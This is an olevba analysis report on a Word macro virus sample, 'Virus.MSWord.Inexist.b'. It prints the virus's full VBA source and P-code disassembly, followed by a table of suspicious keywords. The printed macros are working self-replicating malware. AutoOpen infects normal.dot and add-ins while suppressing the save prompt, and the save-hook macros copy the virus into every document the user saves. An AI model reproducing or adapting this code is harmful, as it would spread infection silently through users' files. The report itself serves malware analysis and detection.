olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Inexist.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Inexist.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FichierEnregistrerSous.bas 
in file: Virus.MSWord.Inexist.b - OLE stream: 'Macros/VBA/FichierEnregistrerSous'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim l$
Dim v$
Dim m1$
Dim m2$
Dim m3$
Dim m$
Dim d$
Dim save_is_ok
Dim dlg As Object
Dim old$
Dim old_window$
Dim new_window$
'**********************************
' Warning, don't change anything.
'**********************************
On Error GoTo -1: On Error GoTo EndFichierEnregistrerSous
l$ = WordBasic.[AppInfo$](16)
v$ = WordBasic.[AppInfo$](2)
If l$ <> "Français" Or WordBasic.Val(v$) < 6 Then GoTo EndFichierEnregistrerSous
m1$ = "AutoOpen"
m2$ = "FichierEnregistrer"
m3$ = "FichierEnregistrerSous"
m$ = WordBasic.[MacroFileName$](m3$)
d$ = WordBasic.[SelectionFileName$]()
save_is_ok = 0
'If file is infected and not .dot
If (m$ = d$) And (UCase(WordBasic.[Right$](m$, 3)) <> "DOT") Then
  Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
  WordBasic.CurValues.DocumentStatistics dlg
  old$ = dlg.Template
  old_window$ = WordBasic.[WindowName$]()
  WordBasic.FileNew Template:=d$, NewTemplate:=0
  new_window$ = WordBasic.[WindowName$]()
  save_is_ok = 1

'FenDocDéplacement 6, 22
'FenDocDimension 753, 459

  WordBasic.FileTemplates Template:=old$
  WordBasic.ToolsMacro Name:=m3$, Show:=2, Run:=1
  'Close old_window$ without saving
  WordBasic.Activate old_window$
  WordBasic.FileClose 2
  save_is_ok = 2
Else
  WordBasic.ToolsMacro Name:=m3$, Show:=2, Run:=1
End If
EndFichierEnregistrerSous:
If save_is_ok = 1 Then
  WordBasic.Activate new_window$
  WordBasic.FileClose 2
End If
Err.Number = 0
On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FichierEnregistrer.bas 
in file: Virus.MSWord.Inexist.b - OLE stream: 'Macros/VBA/FichierEnregistrer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim debug_
Dim l$
Dim v$
Dim m1$
Dim m2$
Dim m3$
Dim d$
Dim m$
'**********************************
' Warning, don't change anything.
'**********************************
On Error GoTo -1: On Error GoTo EndFichierEnregistrer
'Debug=0 Oui, Debug=1 Non
debug_ = 0
l$ = WordBasic.[AppInfo$](16)
v$ = WordBasic.[AppInfo$](2)
If l$ <> "Français" Or WordBasic.Val(v$) < 6 Then GoTo EndFichierEnregistrer
m1$ = "AutoOpen"
m2$ = "FichierEnregistrer"
m3$ = "FichierEnregistrerSous"
'Save files with a name
d$ = WordBasic.[SelectionFileName$]()
If (WordBasic.[Right$](d$, 1) = "\") And (WordBasic.IsMacro() = 0) Then
  WordBasic.ToolsMacro Name:=m2$, Show:=2, Run:=1
  d$ = WordBasic.[SelectionFileName$]()
End If
'Infect file
m$ = WordBasic.[MacroFileName$](m2$)
If (m$ <> d$) And (WordBasic.IsMacro() = 0) Then
  'Save file d$ as template (.Format=1)
  WordBasic.FileSaveAs Format:=1, AddToMru:=0
  'Copy macros
  WordBasic.MacroCopy m$ + ":" + m1$, d$ + ":" + m1$, debug_
  WordBasic.MacroCopy m$ + ":" + m2$, d$ + ":" + m2$, debug_
  WordBasic.MacroCopy m$ + ":" + m3$, d$ + ":" + m3$, debug_
End If
'Save the file d$ with its new macros
WordBasic.FileSave
EndFichierEnregistrer:
Err.Number = 0
On Error GoTo -1: On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Inexist.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim debug_
Dim l$
Dim v$
Dim m1$
Dim m2$
Dim m3$
Dim m$
Dim i
Dim d$
Dim DotPath$
'**********************************
' Warning, don't change anything.
'**********************************
On Error Resume Next
'Debug=0 Oui, Debug=1 Non
debug_ = 0
l$ = WordBasic.[AppInfo$](16)
v$ = WordBasic.[AppInfo$](2)
If l$ <> "Français" Or WordBasic.Val(v$) < 6 Then GoTo EndAutoOpen
m1$ = "AutoOpen"
m2$ = "FichierEnregistrer"
m3$ = "FichierEnregistrerSous"
WordBasic.DisableAutoMacros 1
m$ = WordBasic.[MacroFileName$](m1$)
For i = 1 To WordBasic.CountAddIns()
  d$ = WordBasic.[GetAddInName$](i)
  'Copy macros
If MacroExist(m1$, d$) = 0 And MacroExist(m2$, d$) = 0 And MacroExist(m3$, d$) = 0 Then
    WordBasic.MacroCopy m$ + ":" + m1$, d$ + ":" + m1$, debug_
    WordBasic.MacroCopy m$ + ":" + m2$, d$ + ":" + m2$, debug_
    WordBasic.MacroCopy m$ + ":" + m3$, d$ + ":" + m3$, debug_
  End If
Next
DotPath$ = WordBasic.[DefaultDir$](3)
If DotPath$ = "" Then DotPath$ = WordBasic.[DefaultDir$](2)
If WordBasic.[Right$](DotPath$, 1) <> "\" Then DotPath$ = DotPath$ + "\"
d$ = WordBasic.[Files$](DotPath$ + "normal.dot")
If (d$ <> "") Then
  'Copy macros
  If MacroExist(m1$, d$) = 0 And MacroExist(m2$, d$) = 0 And MacroExist(m3$, d$) = 0 Then
    WordBasic.MacroCopy m$ + ":" + m1$, d$ + ":" + m1$, debug_
    WordBasic.MacroCopy m$ + ":" + m2$, d$ + ":" + m2$, debug_
    WordBasic.MacroCopy m$ + ":" + m3$, d$ + ":" + m3$, debug_
  End If
End If
'Saving Normal.dot won't be seen
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.DisableAutoMacros 0
EndAutoOpen:
Err.Number = 0
On Error GoTo -1: On Error GoTo 0
End Sub

Private Function MacroExist(a$, b$)
Dim i
On Error GoTo -1: On Error GoTo notfound
i = WordBasic.IsExecuteOnly(b$ + ":" + a$)
MacroExist = -1
'MsgBox b$ + ":" + a$ + " existe"
GoTo suite
notfound:
Err.Number = 0
MacroExist = 0
'MsgBox b$ + ":" + a$ + " inexistante"
suite:
On Error Resume Next
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Inexist.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FichierEnregistrerSous - 3590 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn l
' Line #3:
' 	Dim 
' 	VarDefn v
' Line #4:
' 	Dim 
' 	VarDefn m1
' Line #5:
' 	Dim 
' 	VarDefn m2
' Line #6:
' 	Dim 
' 	VarDefn m3
' Line #7:
' 	Dim 
' 	VarDefn m
' Line #8:
' 	Dim 
' 	VarDefn d
' Line #9:
' 	Dim 
' 	VarDefn save_is_ok
' Line #10:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #11:
' 	Dim 
' 	VarDefn old
' Line #12:
' 	Dim 
' 	VarDefn old_window
' Line #13:
' 	Dim 
' 	VarDefn new_window
' Line #14:
' 	QuoteRem 0x0000 0x0022 "**********************************"
' Line #15:
' 	QuoteRem 0x0000 0x0020 " Warning, don't change anything."
' Line #16:
' 	QuoteRem 0x0000 0x0022 "**********************************"
' Line #17:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError EndFichierEnregistrerSous 
' Line #18:
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	St l$ 
' Line #19:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	St v$ 
' Line #20:
' 	Ld l$ 
' 	LitStr 0x0008 "Français"
' 	Ne 
' 	Ld v$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0006 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo EndFichierEnregistrerSous 
' 	EndIf 
' Line #21:
' 	LitStr 0x0008 "AutoOpen"
' 	St m1$ 
' Line #22:
' 	LitStr 0x0012 "FichierEnregistrer"
' 	St m2$ 
' Line #23:
' 	LitStr 0x0016 "FichierEnregistrerSous"
' 	St m3$ 
' Line #24:
' 	Ld m3$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	St m$ 
' Line #25:
' 	Ld WordBasic 
' 	ArgsMemLd [SelectionFileName$] 0x0000 
' 	St d$ 
' Line #26:
' 	LitDI2 0x0000 
' 	St save_is_ok 
' Line #27:
' 	QuoteRem 0x0000 0x0020 "If file is infected and not .dot"
' Line #28:
' 	Ld m$ 
' 	Ld d$ 
' 	Eq 
' 	Paren 
' 	Ld m$ 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0003 "DOT"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd DocumentStatistics 0x0001 
' 	Set dlg 
' Line #30:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall DocumentStatistics 0x0001 
' Line #31:
' 	Ld dlg 
' 	MemLd Template 
' 	St old$ 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	St old_window$ 
' Line #33:
' 	Ld d$ 
' 	ParamNamed Template 
' 	LitDI2 0x0000 
' 	ParamNamed NewTemplate 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0002 
' Line #34:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	St new_window$ 
' Line #35:
' 	LitDI2 0x0001 
' 	St save_is_ok 
' Line #36:
' Line #37:
' 	QuoteRem 0x0000 0x0017 "FenDocDéplacement 6, 22"
' Line #38:
' 	QuoteRem 0x0000 0x0018 "FenDocDimension 753, 459"
' Line #39:
' Line #40:
' 	Ld old$ 
' 	ParamNamed Template 
' 	Ld WordBasic 
' 	ArgsMemCall FileTemplates 0x0001 
' Line #41:
' 	Ld m3$ 
' 	ParamNamed New 
' 	LitDI2 0x0002 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Run 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #42:
' 	QuoteRem 0x0002 0x0020 "Close old_window$ without saving"
' Line #43:
' 	Ld old_window$ 
' 	Ld WordBasic 
' 	ArgsMemCall Activate 0x0001 
' Line #44:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #45:
' 	LitDI2 0x0002 
' 	St save_is_ok 
' Line #46:
' 	ElseBlock 
' Line #47:
' 	Ld m3$ 
' 	ParamNamed New 
' 	LitDI2 0x0002 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Run 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Label EndFichierEnregistrerSous 
' Line #50:
' 	Ld save_is_ok 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	Ld new_window$ 
' 	Ld WordBasic 
' 	ArgsMemCall Activate 0x0001 
' Line #52:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #55:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #56:
' 	EndSub 
' Macros/VBA/FichierEnregistrer - 3208 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn debug_
' Line #3:
' 	Dim 
' 	VarDefn l
' Line #4:
' 	Dim 
' 	VarDefn v
' Line #5:
' 	Dim 
' 	VarDefn m1
' Line #6:
' 	Dim 
' 	VarDefn m2
' Line #7:
' 	Dim 
' 	VarDefn m3
' Line #8:
' 	Dim 
' 	VarDefn d
' Line #9:
' 	Dim 
' 	VarDefn m
' Line #10:
' 	QuoteRem 0x0000 0x0022 "**********************************"
' Line #11:
' 	QuoteRem 0x0000 0x0020 " Warning, don't change anything."
' Line #12:
' 	QuoteRem 0x0000 0x0022 "**********************************"
' Line #13:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError EndFichierEnregistrer 
' Line #14:
' 	QuoteRem 0x0000 0x0018 "Debug=0 Oui, Debug=1 Non"
' Line #15:
' 	LitDI2 0x0000 
' 	St debug_ 
' Line #16:
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	St l$ 
' Line #17:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	St v$ 
' Line #18:
' 	Ld l$ 
' 	LitStr 0x0008 "Français"
' 	Ne 
' 	Ld v$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0006 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo EndFichierEnregistrer 
' 	EndIf 
' Line #19:
' 	LitStr 0x0008 "AutoOpen"
' 	St m1$ 
' Line #20:
' 	LitStr 0x0012 "FichierEnregistrer"
' 	St m2$ 
' Line #21:
' 	LitStr 0x0016 "FichierEnregistrerSous"
' 	St m3$ 
' Line #22:
' 	QuoteRem 0x0000 0x0016 "Save files with a name"
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [SelectionFileName$] 0x0000 
' 	St d$ 
' Line #24:
' 	Ld d$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemLd IsMacro 0x0000 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #25:
' 	Ld m2$ 
' 	ParamNamed New 
' 	LitDI2 0x0002 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Run 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #26:
' 	Ld WordBasic 
' 	ArgsMemLd [SelectionFileName$] 0x0000 
' 	St d$ 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	QuoteRem 0x0000 0x000B "Infect file"
' Line #29:
' 	Ld m2$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	St m$ 
' Line #30:
' 	Ld m$ 
' 	Ld d$ 
' 	Ne 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemLd IsMacro 0x0000 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #31:
' 	QuoteRem 0x0002 0x0024 "Save file d$ as template (.Format=1)"
' Line #32:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #33:
' 	QuoteRem 0x0002 0x000B "Copy macros"
' Line #34:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m1$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m1$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #35:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m2$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m2$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #36:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m3$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m3$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	QuoteRem 0x0000 0x0024 "Save the file d$ with its new macros"
' Line #39:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #40:
' 	Label EndFichierEnregistrer 
' Line #41:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #42:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #43:
' 	EndSub 
' Macros/VBA/AutoOpen - 5417 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn debug_
' Line #3:
' 	Dim 
' 	VarDefn l
' Line #4:
' 	Dim 
' 	VarDefn v
' Line #5:
' 	Dim 
' 	VarDefn m1
' Line #6:
' 	Dim 
' 	VarDefn m2
' Line #7:
' 	Dim 
' 	VarDefn m3
' Line #8:
' 	Dim 
' 	VarDefn m
' Line #9:
' 	Dim 
' 	VarDefn i
' Line #10:
' 	Dim 
' 	VarDefn d
' Line #11:
' 	Dim 
' 	VarDefn DotPath
' Line #12:
' 	QuoteRem 0x0000 0x0022 "**********************************"
' Line #13:
' 	QuoteRem 0x0000 0x0020 " Warning, don't change anything."
' Line #14:
' 	QuoteRem 0x0000 0x0022 "**********************************"
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	QuoteRem 0x0000 0x0018 "Debug=0 Oui, Debug=1 Non"
' Line #17:
' 	LitDI2 0x0000 
' 	St debug_ 
' Line #18:
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	St l$ 
' Line #19:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	St v$ 
' Line #20:
' 	Ld l$ 
' 	LitStr 0x0008 "Français"
' 	Ne 
' 	Ld v$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0006 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo EndAutoOpen 
' 	EndIf 
' Line #21:
' 	LitStr 0x0008 "AutoOpen"
' 	St m1$ 
' Line #22:
' 	LitStr 0x0012 "FichierEnregistrer"
' 	St m2$ 
' Line #23:
' 	LitStr 0x0016 "FichierEnregistrerSous"
' 	St m3$ 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #25:
' 	Ld m1$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	St m$ 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountAddIns 0x0000 
' 	For 
' Line #27:
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAddInName$] 0x0001 
' 	St d$ 
' Line #28:
' 	QuoteRem 0x0002 0x000B "Copy macros"
' Line #29:
' 	Ld m1$ 
' 	Ld d$ 
' 	ArgsLd MacroExist 0x0002 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld m2$ 
' 	Ld d$ 
' 	ArgsLd MacroExist 0x0002 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld m3$ 
' 	Ld d$ 
' 	ArgsLd MacroExist 0x0002 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #30:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m1$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m1$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #31:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m2$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m2$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #32:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m3$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m3$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St DotPath$ 
' Line #36:
' 	Ld DotPath$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St DotPath$ 
' 	EndIf 
' Line #37:
' 	Ld DotPath$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld DotPath$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St DotPath$ 
' 	EndIf 
' Line #38:
' 	Ld DotPath$ 
' 	LitStr 0x000A "normal.dot"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	St d$ 
' Line #39:
' 	Ld d$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #40:
' 	QuoteRem 0x0002 0x000B "Copy macros"
' Line #41:
' 	Ld m1$ 
' 	Ld d$ 
' 	ArgsLd MacroExist 0x0002 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld m2$ 
' 	Ld d$ 
' 	ArgsLd MacroExist 0x0002 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld m3$ 
' 	Ld d$ 
' 	ArgsLd MacroExist 0x0002 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #42:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m1$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m1$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #43:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m2$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m2$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #44:
' 	Ld m$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m3$ 
' 	Add 
' 	Ld d$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld m3$ 
' 	Add 
' 	Ld debug_ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	QuoteRem 0x0000 0x001F "Saving Normal.dot won't be seen"
' Line #48:
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #49:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #50:
' 	Label EndAutoOpen 
' Line #51:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #52:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #53:
' 	EndSub 
' Line #54:
' Line #55:
' 	FuncDefn (Private Function MacroExist(a, B))
' Line #56:
' 	Dim 
' 	VarDefn i
' Line #57:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError notfound 
' Line #58:
' 	Ld B$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd IsExecuteOnly 0x0001 
' 	St i 
' Line #59:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MacroExist 
' Line #60:
' 	QuoteRem 0x0000 0x0020 "MsgBox b$ + ":" + a$ + " existe""
' Line #61:
' 	GoTo suite 
' Line #62:
' 	Label notfound 
' Line #63:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #64:
' 	LitDI2 0x0000 
' 	St MacroExist 
' Line #65:
' 	QuoteRem 0x0000 0x0025 "MsgBox b$ + ":" + a$ + " inexistante""
' Line #66:
' 	Label suite 
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

